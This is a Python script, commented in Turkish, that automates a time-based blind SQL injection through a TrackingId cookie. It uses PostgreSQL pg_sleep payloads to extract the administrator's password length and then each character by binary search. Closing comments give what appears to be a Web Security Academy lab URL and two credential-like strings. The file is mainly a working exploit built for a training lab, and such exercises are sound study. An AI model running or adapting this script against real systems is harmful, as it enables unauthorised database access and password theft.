import requests
import time
import concurrent.futures

# Kullanıcıdan gerekli bilgileri al
url = input("URL'i girin: ")
tracking_id = input("Tracking ID'yi girin: ")
session_id = input("Session ID'yi girin: ")
say='1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'
low= 0
high= 160
def check_response(payload):
    st = time.time()
    cookies = {'TrackingId': payload, 'session': session_id}
    response = requests.get(url, cookies=cookies)
    ft= time.time()
    delay = ft-st
    print({delay})
    print(f"Payload: {payload} | Delay: {delay}")
    if delay > 4:
        return True
    return False
def find_password_length():
    for length in range(1, 25):  # Şifrenin 1'den 25'e kadar olan uzunluklarını dene
        payload = f"{tracking_id}'%3BSELECT+CASE+WHEN+(username='administrator'+" \
                  f"AND+LENGTH(password)={length})+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--"
        print(f"Testing length: {length}")
        if check_response(payload):
            return length
    return None
passus = find_password_length()
def find_char_for_position(position):
    low, high = 32, 126  # ASCII karakter aralığı
    while low < high:
        mid = (low + high) // 2
        payload = f"{tracking_id}'%3BSELECT+CASE+WHEN+(username='administrator'+AND+ASCII" \
                  f"(SUBSTR(password,{position},1))>{mid})+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--"
        if check_response(payload):
            low = mid + 1
        else:
            high = mid
    return chr(low) if low == high else None


def find_password(password_length):
    password = ''
    for i in range(1, password_length + 1):
        char = find_char_for_position(i)
        if char:
            password += char
            print(f"Found character: {char} at position {i}")
        else:
            print(f"Could not find character at position {i}")
            break
    return password

# Şifrenin uzunluğunu bul
password_length = find_password_length()
if password_length:
    print(f"Password length: {password_length}")
    # Şifreyi bul
    password = find_password(password_length)
    print(f"Password: {password}")
else:
    print("Could not determine password length.")

    # https://0ae1009e0455e58c867c5251007100d9.web-security-academy.net/filter?category=Gifts
    #HrNZqKQ3N4a40C3v
    #1m9JfETSq3QziNv68Pxo54bb3JHBdMS3